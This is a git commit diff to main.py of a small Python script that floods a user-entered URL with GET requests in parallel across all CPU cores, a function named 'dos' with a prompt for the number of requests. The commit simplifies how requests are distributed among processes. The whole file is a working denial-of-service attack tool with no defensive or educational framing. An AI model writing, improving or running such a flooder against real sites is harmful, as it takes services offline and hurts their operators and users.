4899cd6d1e29ed0a109c4aaf828dec988e89544b
sudo0272 <sudo0272@gmail.com>
2020-03-28 23:16:56 +0900

    improve

--- main.py
+++ main.py
@@ -3,26 +3,13 @@ import parmap
 import requests
 
 
-def split_number(n, m):
-    if m == 1:
-        return [n]
-
-    equal = n // m
-    left = n - (equal * (m - 1))
-
-    return [equal for i in range(m - 1)] + [left]
-
-
 def dos(n, url):
-    for i in range(n):
-        requests.get(url)
+    requests.get(url)
 
 
 if __name__ == '__main__':
-    coresCount = multiprocessing.cpu_count()
-
     target = input('URL: ')
 
-    targetCount = split_number(int(input('횟수: ')), coresCount)
+    targetCount = int(input('횟수: '))
 
-    parmap.map(dos, targetCount, target, pm_pbar=True, pm_processes=coresCount)
+    parmap.map(dos, range(targetCount), target, pm_pbar=True, pm_processes=multiprocessing.cpu_count())
